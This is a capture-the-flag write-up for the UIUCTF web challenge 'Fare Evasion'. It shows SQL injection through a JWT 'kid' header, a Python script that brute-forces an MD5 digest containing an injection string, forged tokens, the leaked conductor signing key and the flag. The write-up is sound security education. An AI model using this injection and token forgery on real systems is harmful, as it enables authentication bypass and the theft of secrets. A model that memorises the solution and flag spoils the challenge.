# Fare Evasion
**Category:** Web

**Points:** 370

**Solves:** 173

### Solution Overview

We can achieve SQL injection through the `kid` (key id) header of the JWT cookie. We change the JWT header `kid` to `32d4627866e846c346fee3659eaec1aa`, a brute-forced random string that, when MD5 hashed then encoded with Latin-1, matches the regex `.*'[oO][rR]'[1-9].*` (to allow for SQL injection). We then sign it with the provided key: `a_boring_passenger_signing_key_?`.

Using our new token, `eyJhbGciOiJIUzI1NiIsImtpZCI6IjMyZDQ2Mjc4NjZlODQ2YzM0NmZlZTM2NTllYWVjMWFhIiwidHlwIjoiSldUIn0.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.nHd3DtP9PwzT6Mm5wR8lwamie0kXOFpfjq9v-3AN-Vc`, we perform an SQL injection and access the conductor key: `conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e`.

Finally, we sign our token with the conductor key, getting `eyJhbGciOiJIUzI1NiIsImtpZCI6IjMyZDQ2Mjc4NjZlODQ2YzM0NmZlZTM2NTllYWVjMWFhIiwidHlwIjoiSldUIn0.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.u_Y5T7Ctm74HViemCkIAbjAH2u_g4eHUBtG_pC6OVUQ`, which gives us the flag.

![Flag](/images/FareEvasionFlag.png)

### Detailed Solution

1. **Initial Investigation:**
    Visiting the website, we encounter a button that triggers a pop-up instructing us to sign our own tickets. It also provides a hashed string in Latin-1 and a secret, `a_boring_passenger_signing_key_?`. This suggests the use of JWT tokens.

    ![Website](/images/FareEvasionWebsite.png)

2. **Examining the Script:**
    At the bottom of the page source there is this script:
    ```js
    <script>
        async function pay() {
            // i could not get sqlite to work on the frontend :(
            /*
                db.each(`SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`, (err, row) => {
                ???????
            */
            const r = await fetch("/pay", { method: "POST" });
            const j = await r.json();
            document.getElementById("alert").classList.add("opacity-100");
            // todo: convert md5 to hex string instead of latin1??
            document.getElementById("alert").innerText = j["message"];
            setTimeout(() => { document.getElementById("alert").classList.remove    ("opacity-100") }, 5000);
        }
    </script>
    ```
    This script sends a POST request to `/pay` and displays the response. There is a 'todo' comment at the bottom which hints towards the solution but I'll get to that later. Notably, the comment reveals an SQL query:
    ```sql
    SELECT * FROM keys WHERE kid = '${md5(headerKid)}'
    ```
    Presumably our goal is to find some way of getting SQL injection.


3. **JWT Token Analysis:**
    We have a JWT cookie, but its signature is invalid. 
    
    ![JWT Cookie](/images/FareEvasionCookie.png)
    ![JWT invalid](/images/FareEvasionJWTinvalid.png)

    However, using the provided secret, `a_boring_passenger_signing_key_?`, we can sign it:

    ![JWT valid](/images/FareEvasionJWTvalid.png)

4. **Modifying `kid` for SQL Injection:**
    By setting the JWT header `kid` to 'a' and paying, we notice the pop-up changes:

    ![New Pop Up](/images/FareEvasionJWTa.png)

    This confirms that the `kid` is influencing the SQL query.  I didn't know in the backend whether or not the `kid` string would be inserted in the query or if the code would call `md5(headerKid)` directly. If it was inserted in, a basic `' or 1 --` should work. It didn't end up working but when trying different variations `' or 1;` created a suprising pop up.

    ![Null Pop Up](/images/FareEvasionNull.png)

    It's all coming together now, the md5 hash is encoded in latin-1 like the hint said. That's why the original hashed value looks so weird. Sure enough, this md5 hash to latin-1 contains a null char.

    ![hashed null char](/images/FareEvasionNullHash.png)

5. **Finding an Exploit String:**
    This would require a lot of luck so we should try to make our injection as small as possible, something like `...'or'...` would be nice. Turns out string truthiness in SQL is a bit [weird](https://stackoverflow.com/questions/12221211/how-does-string-truthiness-work-in-mysql) so we ended up using `.*'[oO][rR]'[1-9]`. `'` to close off the original string. Any capitalization of 'or'. `'` to start the second string. A non zero number for truthiness. Finally, `.*` for any prefix. (Technically I also need to make sure that there are no null chars and no other single quotes in my hash but those are rather unlikely and worst case is just running my script again).

    We brute-force random strings, hash them using MD5, convert them to Latin-1, and check if they match the regex pattern. After around 10 minutes, we find a suitable string:

    ```py
    def check_substring_and_nulls(md5_hex):
        latin1_string = bytes.fromhex(md5_hex).decode('latin-1', errors='ignore')
        if re.match(".*'[oO][rR]'[1-9]", latin1_string) and '\x00' not in latin1_string:
            return True
        return False
        
    md5_hex = md5_hash_string(random_string)
    if check_substring_and_nulls(md5_hex):
        ...
    ```

    Console output:
    ```
    on iter 501000000
    on iter 502000000
    Random String: 32d4627866e846c346fee3659eaec1aa
    MD5 Hex: 274f72273279e3bf6f93443f39a42e88
    Latin-1 String: 'Or'2yã¿oD?9¤.
    ```

6. **Performing the Injection:**
    Setting the JWT header `kid` to `32d4627866e846c346fee3659eaec1aa`, we perform the injection and receive the conductor key:

    ![Website injected](/images/FareEvasionInjectedAlert.png)

    Full message:
    ```json
    {
        "message": "Key isn't passenger or conductor. Please sign your own tickets. \nhashed \u00f4\u008c\u00f7u\u009e\u00deIB\u0090\u0005\u0084\u009fB\u00e7\u00d9+ secret: conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e\nhashed _\bR\u00f2\u001es\u00dcx\u00c9\u00c4\u0002\u00c5\u00b4\u0012\\\u00e4 secret: a_boring_passenger_signing_key_?",
        "success": false
    }
    ```
    Extracted conductor key: `conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e`

7. **Final JWT Token:**
    Signing our JWT with the conductor key:

    ![Sign with conductor key](/images/FareEvasionConductorKey.png)

    Using this new token on the website gives us the flag:

    ![Flag](/images/FareEvasionFlag.png)

### Script

```python
import random
import string
import hashlib
import re

letters = string.ascii_letters + string.digits

def md5_hash_string(input_string):
    """Hash the input string using MD5 and return the hexadecimal digest."""
    md5_hash = hashlib.md5(input_string.encode('utf-8'))
    return md5_hash.hexdigest()

def check_substring_and_nulls(md5_hex):
    """Convert MD5 hex digest to Latin-1 and check for substring and null characters."""
    latin1_string = bytes.fromhex(md5_hex).decode('latin-1', errors='ignore')
    if re.match(".*'[oO][rR]'[1-9]", latin1_string) and '\x00' not in latin1_string:
        return True
    return False

def main():
    random_string = ''.join(random.choice(letters) for _ in range(10))
    for i in range(1000000000):
        md5_hex = md5_hash_string(random_string)
        if check_substring_and_nulls(md5_hex):
            print(f"Random String: {random_string}")
            print(f"MD5 Hex: {md5_hex}")
            latin1_string = bytes.fromhex(md5_hex).decode('latin-1', errors='ignore')
            print(f"Latin-1 String: {latin1_string}")
            break
        if i % 1000000 == 0:
            print("on iter", i)
        # Use previous hash instead of new random string to optimize speed
        random_string = md5_hex

if __name__ == "__main__":
    main()
```

### Flag

```plaintext
uiuctf{sigpwny_does_not_condone_turnstile_hopping!}
```